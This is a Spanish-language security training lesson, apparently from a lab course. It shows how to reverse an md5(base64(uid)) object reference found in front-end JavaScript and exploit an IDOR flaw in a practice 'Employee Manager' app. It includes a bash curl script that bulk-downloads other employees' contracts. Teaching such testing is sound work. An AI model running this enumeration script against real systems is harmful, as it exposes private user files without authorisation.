En la sección anterior, vimos un ejemplo de un IDOR que usa `employee uids` en texto claro, lo que facilita la enumeración. En algunos casos, las aplicaciones web generan hashes o codifican sus referencias de objetos, lo que hace que la enumeración sea más difícil, pero aún puede ser posible.

Volvamos a la aplicación web `Employee Manager` para probar la funcionalidad de `Contracts`:

`http://SERVER_IP:PORT/contracts.php`

![IDOR Contracts](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_contracts.jpg)

Si hacemos clic en el archivo `Employment_contract.pdf`, comienza a descargar el archivo. La solicitud interceptada en Burp se ve de la siguiente manera:

![Download Contract](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_download_contract.jpg)

Vemos que está enviando una solicitud `POST` a `download.php` con los siguientes datos:

```r
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

Usar un script `download.php` para descargar archivos es una práctica común para evitar vincular directamente a los archivos, ya que eso puede ser explotable con múltiples ataques web. En este caso, la aplicación web no está enviando la referencia directa en texto claro, sino que parece estar hasheándola en un formato `md5`. Los hashes son funciones unidireccionales, por lo que no podemos decodificarlos para ver sus valores originales.

Podemos intentar hashear varios valores, como `uid`, `username`, `filename` y muchos otros, y ver si alguno de sus hashes `md5` coincide con el valor anterior. Si encontramos una coincidencia, podemos replicarlo para otros usuarios y recopilar sus archivos. Por ejemplo, intentemos comparar el hash `md5` de nuestro `uid`, y ver si coincide con el hash anterior:

```r
echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b -
```

Desafortunadamente, los hashes no coinciden. Podemos intentar esto con varios otros campos, pero ninguno de ellos coincide con nuestro hash. En casos avanzados, también podemos utilizar `Burp Comparer` y fuzzear varios valores y luego compararlos con nuestro hash para ver si encontramos coincidencias. En este caso, el hash `md5` podría ser para un valor único o una combinación de valores, lo que sería muy difícil de predecir, haciendo esta referencia directa un `Secure Direct Object Reference`. Sin embargo, hay una falla fatal en esta aplicación web.

---

## Function Disclosure

Como la mayoría de las aplicaciones web modernas están desarrolladas utilizando frameworks de JavaScript, como `Angular`, `React` o `Vue.js`, muchos desarrolladores web pueden cometer el error de realizar funciones sensibles en el front-end, lo que las expondría a los atacantes. Por ejemplo, si el hash anterior se estaba calculando en el front-end, podemos estudiar la función y luego replicar lo que está haciendo para calcular el mismo hash. Afortunadamente para nosotros, este es precisamente el caso en esta aplicación web.

Si miramos el enlace en el código fuente, vemos que está llamando a una función de JavaScript con `javascript:downloadContract('1')`. Mirando la función `downloadContract()` en el código fuente, vemos lo siguiente:

```r
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

Esta función parece estar enviando una solicitud `POST` con el parámetro `contract`, que es lo que vimos anteriormente. El valor que está enviando es un hash `md5` utilizando la biblioteca `CryptoJS`, que también coincide con la solicitud que vimos antes. Entonces, lo único que queda por ver es qué valor se está hasheando.

En este caso, el valor que se está hasheando es `btoa(uid)`, que es la cadena codificada en `base64` de la variable `uid`, que es un argumento de entrada para la función. Volviendo al enlace anterior donde se llamó a la función, vemos que llama a `downloadContract('1')`. Entonces, el valor final que se está utilizando en la solicitud `POST` es la cadena codificada en `base64` de `1`, que luego fue hasheada con `md5`.

Podemos probar esto codificando en `base64` nuestro `uid=1`, y luego hasheándolo con `md5`, de la siguiente manera:

```r
echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

**Tip:** Estamos usando el flag `-n` con `echo`, y el flag `-w 0` con `base64`, para evitar agregar nuevas líneas, con el fin de poder calcular el hash `md5` del mismo valor, sin hashear nuevas líneas, ya que eso cambiaría el hash `md5` final.

Como podemos ver, este hash coincide con el hash en nuestra solicitud, lo que significa que hemos revertido con éxito la técnica de hashing utilizada en las referencias de objetos, convirtiéndolas en IDORs. Con eso, podemos comenzar a enumerar los contratos de otros empleados utilizando el mismo método de hashing que usamos anteriormente. `Antes de continuar, intenta escribir un script similar al que usamos en la sección anterior para enumerar todos los contratos`.

---

## Mass Enumeration

Una vez más, escribamos un simple script en bash para recuperar todos los contratos de los empleados. Más a menudo que no, este es el método más fácil y eficiente de enumerar datos y archivos a través de vulnerabilidades IDOR. En casos más avanzados, podemos utilizar herramientas como `Burp Intruder` o `ZAP Fuzzer`, pero un simple script en bash debería ser el mejor curso para nuestro ejercicio.

Podemos comenzar calculando el hash para cada uno de los primeros diez empleados utilizando el mismo comando anterior mientras usamos `tr -d` para eliminar los caracteres `-` finales, de la siguiente manera:

```r
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
```

A continuación, podemos hacer una solicitud `POST` en `download.php` con cada uno de los hashes anteriores como el valor `contract`, lo que debería darnos nuestro script final:

```r
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

Con eso, podemos ejecutar el script, y debería descargar todos los contratos para los empleados 1-10:

```r
bash ./exploit.sh
ls -1

contract_006d1236aee3f92b8322299796ba1989.pdf
contract_0b24df25fe628797b3a50ae0724d2730.pdf
contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf
contract_5d4aace023dc088767b4e08c79415dcd.pdf
contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf
contract_b523ff8d1ced96cef9c86492e790c2fb.pdf
contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
contract_d477819d240e7d3dd9499ed8d23e7158.pdf
contract_f7947d50da7a043693a592b4db43b0a1.pdf
```

Como podemos ver, debido a que pudimos revertir la técnica de hashing utilizada en las referencias de objetos, ahora podemos explotar con éxito la vulnerabilidad IDOR para recuperar los contratos de todos los demás usuarios.